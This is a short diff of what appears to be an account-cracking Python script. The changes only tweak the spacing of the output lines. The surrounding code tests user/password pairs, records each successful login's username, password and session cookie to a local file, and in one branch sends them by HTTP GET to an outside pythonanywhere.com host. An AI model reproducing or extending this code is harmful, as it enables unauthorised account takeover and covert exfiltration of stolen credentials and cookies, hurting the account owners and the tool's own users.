@@ -192,7 +192,7 @@ def ATOM(uid, pww, total_idz):
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                     if xs_value and xs_value.rstrip(';').endswith('-1'):
-                        print('\033[1;92m [ATOM-OK] '+user+' | '+pw+'')
+                        print('\033[1;92m[ATOM-OK]'+user+'|'+pw+'')
                         print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;92m"+kuki)
                         open("/sdcard/ATOM/ATOM-COOKIE-OK.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
                         oks.append(uid)
@@ -203,7 +203,7 @@ def ATOM(uid, pww, total_idz):
                            statusok = (f"{user}|{pw}|{kuki}")
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         else:
-                           print('\033[1;92m [ATOM-OK] '+user+' | '+pw+'')
+                           print('\033[1;92m[ATOM-OK]'+user+'|'+pw+'')
                            print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;92m"+kuki)
                            open("/sdcard/ATOM/ATOM-COOKIE-OK.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
                            oks.append(uid)
